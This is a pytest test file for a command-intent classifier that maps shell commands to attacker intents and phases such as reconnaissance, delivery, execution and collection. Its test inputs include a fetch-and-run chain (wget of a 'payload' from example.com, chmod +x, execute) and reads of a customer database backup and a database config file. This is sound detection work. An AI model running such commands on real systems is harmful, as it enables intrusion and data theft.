
from intelligence.intent.classifier import IntentClassifier


def test_discovery_intent():
    classifier = IntentClassifier()
    results = classifier.classify(["whoami", "uname -a", "hostname"])
    intents = {result.intent for result in results}
    assert "discovery" in intents


def test_file_discovery_intent():
    classifier = IntentClassifier()
    results = classifier.classify(["ls", "pwd", "find /tmp"])
    intents = {result.intent for result in results}
    assert "file_discovery" in intents


def test_payload_retrieval_intent():
    classifier = IntentClassifier()
    results = classifier.classify(["wget http://example.com/payload"])
    intents = {result.intent for result in results}
    assert "payload_retrieval" in intents


def test_execution_intent():
    classifier = IntentClassifier()
    results = classifier.classify(["chmod +x payload", "./payload"])
    intents = {result.intent for result in results}
    assert "execution" in intents


def test_empty_commands_return_no_intent():
    classifier = IntentClassifier()
    assert classifier.classify([]) == []


def test_evidence_is_recorded():
    classifier = IntentClassifier()
    results = classifier.classify(["whoami", "pwd"])

    discovery = next(r for r in results if r.intent == "discovery")
    file_discovery = next(r for r in results if r.intent == "file_discovery")

    assert "whoami" in discovery.evidence
    assert "pwd" in file_discovery.evidence


def test_primary_intent_is_highest_confidence():
    classifier = IntentClassifier()
    results = classifier.classify(
        ["whoami", "uname -a", "hostname", "ls"]
    )

    assert results[0].intent == "discovery"
    assert results[0].confidence > results[1].confidence


def test_discovery_behavior_has_multiple_evidence_items():
    classifier = IntentClassifier()
    results = classifier.classify(["whoami", "uname -a", "hostname"])
    discovery = next(r for r in results if r.intent == "discovery")
    assert len(discovery.evidence) == 3


def test_payload_then_execution_shows_both_intents():
    classifier = IntentClassifier()
    results = classifier.classify(
        [
            "wget http://example.com/payload",
            "chmod +x payload",
            "./payload",
        ]
    )
    intents = {result.intent for result in results}
    assert "payload_retrieval" in intents
    assert "execution" in intents


def test_discovery_intent_has_reconnaissance_phase():
    classifier = IntentClassifier()
    results = classifier.classify(["whoami", "uname -a"])
    discovery = next(r for r in results if r.intent == "discovery")
    assert discovery.phase == "reconnaissance"


def test_file_discovery_intent_has_reconnaissance_phase():
    classifier = IntentClassifier()
    results = classifier.classify(["ls", "pwd"])
    file_discovery = next(
        r for r in results if r.intent == "file_discovery"
    )
    assert file_discovery.phase == "reconnaissance"


def test_payload_retrieval_has_delivery_phase():
    classifier = IntentClassifier()
    results = classifier.classify(["wget http://example.com/payload"])
    payload = next(r for r in results if r.intent == "payload_retrieval")
    assert payload.phase == "delivery"


def test_execution_has_execution_phase():
    classifier = IntentClassifier()
    results = classifier.classify(["chmod +x payload", "./payload"])
    execution = next(r for r in results if r.intent == "execution")
    assert execution.phase == "execution"


def test_classifier_reports_payload_execution_chain():
    classifier = IntentClassifier()
    results = classifier.classify(
        [
            "wget http://example.test/payload",
            "chmod +x payload",
            "./payload",
        ]
    )
    chain = next(
        r for r in results if r.intent == "payload_execution_chain"
    )
    assert chain.phase == "execution"
    assert chain.evidence == [
        "wget http://example.test/payload",
        "chmod +x payload",
        "./payload",
    ]


def test_sensitive_file_read_is_classified():
    classifier = IntentClassifier()
    results = classifier.classify(
        ["cat /var/backups/customer_db.sql"]
    )

    sensitive = next(
        r for r in results if r.intent == "sensitive_file_access"
    )
    assert sensitive.phase == "collection"
    assert sensitive.evidence == [
        "cat /var/backups/customer_db.sql"
    ]


def test_sensitive_config_read_is_classified():
    classifier = IntentClassifier()
    results = classifier.classify(
        ["cat /opt/company/config/database.yml"]
    )
    assert "sensitive_file_access" in {
        result.intent for result in results
    }


def test_listing_sensitive_path_is_not_sensitive_file_access():
    classifier = IntentClassifier()
    results = classifier.classify(
        ["ls -l /var/backups/customer_db.sql"]
    )
    assert "sensitive_file_access" not in {
        result.intent for result in results
    }


def test_ordinary_file_read_is_not_sensitive_file_access():
    classifier = IntentClassifier()
    results = classifier.classify(["cat notes.txt"])
    assert "sensitive_file_access" not in {
        result.intent for result in results
    }


def test_sensitive_file_access_has_collection_phase():
    classifier = IntentClassifier()
    results = classifier.classify(
        ["cat /var/backups/customer_db.sql"]
    )
    sensitive = next(
        r for r in results if r.intent == "sensitive_file_access"
    )
    assert sensitive.phase == "collection"
